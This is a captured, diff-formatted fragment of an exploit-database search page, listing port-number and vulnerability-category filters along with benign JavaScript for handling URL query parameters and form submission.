+                                    
+
+                                        4070
+                                    
+
+                                        4081
+                                    
+
+                                        4105
+                                    
+
+                                        4111
+                                    
+
+                                        4322
+                                    
+
+                                        4343
+                                    
+
+                                        4434
+                                    
+
+                                        4501
+                                    
+
+                                        4555
+                                    
+
+                                        4592
+                                    
+
+                                        4661
+                                    
+
+                                        4750
+                                    
+
+                                        4848
+                                    
+
+                                        5000
+                                    
+
+                                        5060
+                                    
+
+                                        5061
+                                    
+
+                                        5080
+                                    
+
+                                        5081
+                                    
+
+                                        5093
+                                    
+
+                                        5151
+                                    
+
+                                        5180
+                                    
+
+                                        5247
+                                    
+
+                                        5250
+                                    
+
+                                        5272
+                                    
+
+                                        5308
+                                    
+
+                                        5432
+                                    
+
+                                        5466
+                                    
+
+                                        5554
+                                    
+
+                                        5555
+                                    
+
+                                        5600
+                                    
+
+                                        5655
+                                    
+
+                                        5666
+                                    
+
+                                        5800
+                                    
+
+                                        5803
+                                    
+
+                                        5814
+                                    
+
+                                        5858
+                                    
+
+                                        5900
+                                    
+
+                                        5984
+                                    
+
+                                        6066
+                                    
+
+                                        6070
+                                    
+
+                                        6080
+                                    
+
+                                        6082
+                                    
+
+                                        6101
+                                    
+
+                                        6112
+                                    
+
+                                        6129
+                                    
+
+                                        6379
+                                    
+
+                                        6502
+                                    
+
+                                        6503
+                                    
+
+                                        6660
+                                    
+
+                                        6667
+                                    
+
+                                        7001
+                                    
+
+                                        7002
+                                    
+
+                                        7070
+                                    
+
+                                        7071
+                                    
+
+                                        7080
+                                    
+
+                                        7100
+                                    
+
+                                        7144
+                                    
+
+                                        7210
+                                    
+
+                                        7272
+                                    
+
+                                        7290
+                                    
+
+                                        7426
+                                    
+
+                                        7443
+                                    
+
+                                        7510
+                                    
+
+                                        7547
+                                    
+
+                                        7649
+                                    
+
+                                        7770
+                                    
+
+                                        7777
+                                    
+
+                                        7778
+                                    
+
+                                        7787
+                                    
+
+                                        7879
+                                    
+
+                                        7902
+                                    
+
+                                        8000
+                                    
+
+                                        8001
+                                    
+
+                                        8002
+                                    
+
+                                        8004
+                                    
+
+                                        8008
+                                    
+
+                                        8020
+                                    
+
+                                        8022
+                                    
+
+                                        8023
+                                    
+
+                                        8028
+                                    
+
+                                        8030
+                                    
+
+                                        8080
+                                    
+
+                                        8081
+                                    
+
+                                        8082
+                                    
+
+                                        8088
+                                    
+
+                                        8090
+                                    
+
+                                        8181
+                                    
+
+                                        8300
+                                    
+
+                                        8400
+                                    
+
+                                        8443
+                                    
+
+                                        8445
+                                    
+
+                                        8473
+                                    
+
+                                        8500
+                                    
+
+                                        8585
+                                    
+
+                                        8619
+                                    
+
+                                        8800
+                                    
+
+                                        8812
+                                    
+
+                                        8839
+                                    
+
+                                        8880
+                                    
+
+                                        8888
+                                    
+
+                                        9000
+                                    
+
+                                        9001
+                                    
+
+                                        9002
+                                    
+
+                                        9080
+                                    
+
+                                        9090
+                                    
+
+                                        9091
+                                    
+
+                                        9100
+                                    
+
+                                        9124
+                                    
+
+                                        9200
+                                    
+
+                                        9251
+                                    
+
+                                        9256
+                                    
+
+                                        9443
+                                    
+
+                                        9447
+                                    
+
+                                        9784
+                                    
+
+                                        9788
+                                    
+
+                                        9855
+                                    
+
+                                        9876
+                                    
+
+                                        9900
+                                    
+
+                                        9987
+                                    
+
+                                        9993
+                                    
+
+                                        9999
+                                    
+
+                                        10000
+                                    
+
+                                        10001
+                                    
+
+                                        10080
+                                    
+
+                                        10202
+                                    
+
+                                        10203
+                                    
+
+                                        10443
+                                    
+
+                                        10616
+                                    
+
+                                        11000
+                                    
+
+                                        11211
+                                    
+
+                                        11460
+                                    
+
+                                        12203
+                                    
+
+                                        12221
+                                    
+
+                                        12345
+                                    
+
+                                        12397
+                                    
+
+                                        12401
+                                    
+
+                                        13327
+                                    
+
+                                        13701
+                                    
+
+                                        13722
+                                    
+
+                                        13838
+                                    
+
+                                        16992
+                                    
+
+                                        18821
+                                    
+
+                                        18881
+                                    
+
+                                        19000
+                                    
+
+                                        19810
+                                    
+
+                                        19813
+                                    
+
+                                        20000
+                                    
+
+                                        20010
+                                    
+
+                                        20031
+                                    
+
+                                        20111
+                                    
+
+                                        20171
+                                    
+
+                                        22003
+                                    
+
+                                        23423
+                                    
+
+                                        25672
+                                    
+
+                                        26000
+                                    
+
+                                        27015
+                                    
+
+                                        27700
+                                    
+
+                                        28015
+                                    
+
+                                        30000
+                                    
+
+                                        30303
+                                    
+
+                                        31337
+                                    
+
+                                        32400
+                                    
+
+                                        32674
+                                    
+
+                                        32764
+                                    
+
+                                        34205
+                                    
+
+                                        37215
+                                    
+
+                                        37777
+                                    
+
+                                        37848
+                                    
+
+                                        38292
+                                    
+
+                                        40007
+                                    
+
+                                        41523
+                                    
+
+                                        44334
+                                    
+
+                                        46824
+                                    
+
+                                        48080
+                                    
+
+                                        49152
+                                    
+
+                                        50000
+                                    
+
+                                        50496
+                                    
+
+                                        52311
+                                    
+
+                                        52789
+                                    
+
+                                        52869
+                                    
+
+                                        52986
+                                    
+
+                                        53413
+                                    
+
+                                        54345
+                                    
+
+                                        54890
+                                    
+
+                                        55554
+                                    
+
+                                        55555
+                                    
+
+                                        56380
+                                    
+
+                                        57772
+                                    
+
+                                        58080
+                                    
+
+                                        62514
+                                    
+
+
+
+Tag
+
+
+
+                                        WordPress Core
+                                    
+
+                                        Metasploit Framework (MSF)
+                                    
+
+                                        WordPress Plugin
+                                    
+
+                                        SQL Injection (SQLi)
+                                    
+
+                                        Cross-Site Scripting (XSS)
+                                    
+
+                                        File Inclusion (LFI/RFI)
+                                    
+
+                                        Cross-Site Request Forgery (CSRF)
+                                    
+
+                                        Denial of Service (DoS)
+                                    
+
+                                        Code Injection
+                                    
+
+                                        Command Injection
+                                    
+
+                                        Authentication Bypass / Credentials Bypass (AB/CB)
+                                    
+
+                                        Client Side
+                                    
+
+                                        Use After Free (UAF)
+                                    
+
+                                        Out Of Bounds
+                                    
+
+                                        Remote
+                                    
+
+                                        Local
+                                    
+
+                                        XML External Entity (XXE)
+                                    
+
+                                        Integer Overflow
+                                    
+
+                                        Server-Side Request Forgery (SSRF)
+                                    
+
+                                        Race Condition
+                                    
+
+                                        NULL Pointer Dereference
+                                    
+
+                                        Malware
+                                    
+
+                                        Buffer Overflow
+                                    
+
+                                        Heap Overflow
+                                    
+
+                                        Type Confusion
+                                    
+
+                                        Object Injection
+                                    
+
+                                        Bug Report
+                                    
+
+                                        Console
+                                    
+
+                                        Pwn2Own
+                                    
+
+                                        Traversal
+                                    
+
+                                        Deserialization
+                                    
+
+
+
+
+
+
+
+
+                                    Verified
+
+                                    
+
+
+
+
+
+
+
+                                    Has App
+
+                                    
+
+
+
+
+
+
+
+                                    No Metasploit
+
+                                    
+
+
+
+
+
+
+
+
+Search
+
+
+
+
+
+
+
+
+
+
+
+
+    .dataTables_filter input {
+        font-size: 16px;
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    window.addEventListener('popstate', () => {
+        location.reload();
+    }, false);
+
+    $(function () {
+        $('[data-toggle="tooltip"]').tooltip()
+    })
+
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+
+    function removeURLParameter(url, parameter) {
+        //prefer to use l.search if you have a location/link object
+        var urlparts= url.split('?');
+        if (urlparts.length>=2) {
+
+            var prefix= encodeURIComponent(parameter)+'=';
+            var pars= urlparts[1].split(/[&;]/g);
+
+            //reverse iteration as may be destructive
+            for (var i= pars.length; i-- > 0;) {
+                //idiom for string.startsWith
+                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
+                    pars.splice(i, 1);
+                }
+            }
+
+            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
+            window.history.pushState('', document.title, url);
+            return url;
+        } else {
+            window.history.pushState('', document.title, url);
+            return url;
+        }
+    }
+
+    function showFilters() {
+        var x = document.getElementById("exploitFiltersCard");
+        if (x.style.display === "none") {
+            x.style.display = "block";
+        } else {
+            x.style.display = "none";
+        }
+    }
+
+    function updateQueryString(key, value, url) {
+        if (!url) url = window.location.href;
+        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
+            hash;
+
+        if (re.test(url)) {
+            if (typeof value !== 'undefined' && value !== null)
+                return url.replace(re, '$1' + key + "=" + value + '$2$3');
+            else {
+                hash = url.split('#');
+                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
+                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
+                    url += '#' + hash[1];
+
+                window.history.pushState('', document.title, url);
+                return url;
+            }
+        }
+        else {
+            if (typeof value !== 'undefined' && value !== null) {
+                var separator = url.indexOf('?') !== -1 ? '&' : '?';
+                hash = url.split('#');
+                url = hash[0] + separator + key + '=' + value;
+                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
+                    url += '#' + hash[1];
+
+                window.history.pushState('', document.title, url);
+                return url;
+            }
+            else
+                window.history.pushState('', document.title, url);
+                return url;
+        }
+    }
+
+    $('#search').submit(function() {
+        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
+        return true; // ensure form still submits
+    });
+
+    // Un-disable form fields when page loads, in case they click back after submission
+    $('#search').find( ":input" ).prop( "disabled", false );
+
+    // If the ajax call fails, throw the error to the console instead of
+    // popping up an alert to the user
+    $.fn.dataTable.ext.errMode = 'throw';
+
+
+
